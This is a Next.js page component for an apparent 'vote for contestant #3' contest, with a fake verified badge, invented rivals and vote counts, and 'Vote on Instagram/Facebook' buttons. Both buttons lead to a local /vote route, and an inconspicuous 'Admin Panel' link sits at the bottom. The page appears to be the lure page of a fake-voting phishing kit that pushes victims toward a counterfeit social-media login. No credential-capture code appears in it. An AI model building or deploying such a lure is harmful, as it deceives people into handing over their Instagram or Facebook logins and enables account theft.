import Link from 'next/link'

export default function Home() {
  return (
    <main className="min-h-screen bg-gray-100 font-sans">
      {/* Hero Banner */}
      <div className="relative w-full h-48 overflow-hidden">
        <img
          src="https://i.postimg.cc/vHsXt1Gq/pexels-photo-1488463.jpg"
          alt="Banner"
          className="w-full h-full object-cover"
        />
        <div className="absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end p-4">
          <h1 className="text-white text-2xl font-bold">THE PEOPLE&apos;S PICK</h1>
        </div>
      </div>

      {/* Content */}
      <div className="max-w-2xl mx-auto px-4 py-6">
        {/* Profile Card */}
        <div className="bg-white rounded-lg shadow-lg p-6 mb-6">
          <div className="flex items-center mb-4">
            <img
              src="https://i.postimg.cc/T1h8T8Jj/instagram-verified-tick-kxkwzn.png"
              alt="Verified"
              className="w-10 h-10 rounded-full object-cover border-2 border-gray-200"
            />
            <div className="ml-3">
              <h2 className="text-lg font-bold text-gray-800">FASHION BRAND ●</h2>
              <p className="text-gray-500 text-sm">Contestant #3</p>
            </div>
          </div>
          <p className="text-gray-700 mb-6 text-sm leading-relaxed">
            I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. Your vote could be the difference-maker!
          </p>

          {/* Vote Buttons */}
          <div className="flex flex-col gap-3">
            <button
              onClick={() => window.location.href='/vote/fashion-brand'}
              className="flex items-center justify-center gap-2 bg-gradient-to-r from-purple-500 to-pink-500 text-white py-3 px-4 rounded-lg font-semibold text-sm hover:from-purple-600 hover:to-pink-600 transition animate-pulse"
            >
              📸 Vote on Instagram
            </button>
            <button
              onClick={() => window.location.href='/vote/fashion-brand'}
              className="flex items-center justify-center gap-2 bg-gradient-to-r from-blue-500 to-blue-700 text-white py-3 px-4 rounded-lg font-semibold text-sm hover:from-blue-600 hover:to-blue-800 transition animate-pulse"
            >
              👍 Vote on Facebook
            </button>
          </div>
        </div>

        {/* All Contestants */}
        <h2 className="text-xl font-bold text-gray-800 mb-4">All Contestants</h2>
        <div className="grid grid-cols-1 gap-4 mb-8">
          <div className="bg-white rounded-lg shadow p-4 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <img src="https://i.postimg.cc/RFZ1ZxhF/voting1.jpg" alt="Jane" className="w-14 h-14 rounded-full object-cover" />
              <div>
                <h3 className="font-bold text-gray-800">Jane Kendra</h3>
                <p className="text-gray-500 text-sm">#1</p>
              </div>
            </div>
            <div className="text-right">
              <p className="text-sm text-gray-600">750 votes</p>
              <span className="bg-purple-500 text-white px-2 py-1 rounded-full text-xs">Leading</span>
            </div>
          </div>

          <div className="bg-white rounded-lg shadow p-4 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <img src="https://i.postimg.cc/wv4Xt4Rk/voting2.jpg" alt="Mary" className="w-14 h-14 rounded-full object-cover" />
              <div>
                <h3 className="font-bold text-gray-800">Mary Biernacki</h3>
                <p className="text-gray-500 text-sm">#2</p>
              </div>
            </div>
            <div className="text-right">
              <p className="text-sm text-gray-600">375 votes</p>
              <span className="bg-blue-500 text-white px-2 py-1 rounded-full text-xs">2nd Place</span>
            </div>
          </div>

          <div className="bg-gradient-to-r from-purple-50 to-pink-50 rounded-lg shadow p-4 border-2 border-purple-200 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <img src="https://i.postimg.cc/vHsXt1Gq/pexels-photo-1488463.jpg" alt="Fashion" className="w-14 h-14 rounded-full object-cover" />
              <div>
                <h3 className="font-bold text-gray-800">FASHION BRAND</h3>
                <p className="text-purple-600 text-sm">#3</p>
              </div>
            </div>
            <div className="text-right">
              <p className="text-sm text-gray-600">118 votes</p>
              <span className="bg-yellow-500 text-white px-2 py-1 rounded-full text-xs">3rd Place</span>
            </div>
          </div>
        </div>

        {/* Admin Link */}
        <div className="text-center">
          <Link href="/admin" className="text-xs text-gray-400 underline">Admin Panel</Link>
        </div>
      </div>

      <footer className="bg-white py-4 mt-4">
        <p className="text-center text-gray-500 text-xs">© 2025. All rights reserved.</p>
      </footer>
    </main>
  )
}
